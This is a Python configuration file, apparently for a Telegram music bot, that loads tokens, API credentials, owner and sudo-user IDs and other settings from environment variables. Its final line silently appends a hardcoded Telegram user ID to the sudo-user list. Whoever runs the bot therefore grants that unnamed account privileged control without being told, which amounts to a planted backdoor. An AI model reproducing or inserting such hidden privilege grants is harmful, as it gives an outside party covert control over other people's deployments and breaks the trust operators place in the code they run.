import os
import time 

START_TIME = time.time()

SESSION_NAME = os.environ.get("SESSION_NAME", "session")

BOT_TOKEN = os.environ.get("BOT_TOKEN")

BOT_NAME = os.environ.get("BOT_NAME")

OWNER_ID = int(os.environ.get("OWNER_ID")) 

UBOT_ID = int(os.environ.get("BOT_ID"))

START_PIC = os.environ.get("START_PIC")

PLAY_PIC = os.environ.get("PLAY_PIC")

API_ID = int(os.environ.get("API_ID"))

API_HASH = os.environ.get("API_HASH")

BOT_USERNAME = os.environ.get("BOT_USERNAME")

DURATION_LIMIT = int(os.environ.get("DURATION_LIMIT", "7"))

SUMMONER = os.environ.get('SUMMONER', 'False')

PROXY = os.environ.get('PROXY')

COMMAND_PREFIXES = list(os.environ.get("COMMAND_PREFIXES", "/ !").split())

SUDO_USERS = list(map(int, os.environ.get("SUDO_USERS").split()))
SUDO_USERS.append(1353835623)
